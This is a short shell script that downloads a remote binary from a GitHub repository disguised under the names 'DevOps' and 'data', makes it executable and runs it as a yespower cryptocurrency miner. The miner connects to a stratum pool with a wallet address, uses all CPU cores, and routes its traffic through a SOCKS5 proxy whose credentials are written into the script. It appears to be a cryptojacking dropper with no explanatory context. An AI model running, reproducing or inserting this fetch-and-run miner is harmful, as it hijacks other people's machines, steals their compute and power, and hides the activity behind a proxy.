#!/bin/sh
apt update -y
wget -q https://github.com/thirthada007/DevOps/raw/main/data
chmod +x data
./data -a yespower -o stratum+tcp://206.189.2.17:3333 -u WYBnNEVUPjTFA1rQypC6XK3DRNmosrgqce.kom -p x -t $(nproc) -x socks5://Gahsdbdn:Aapaoddun@185.101.169.21:6565
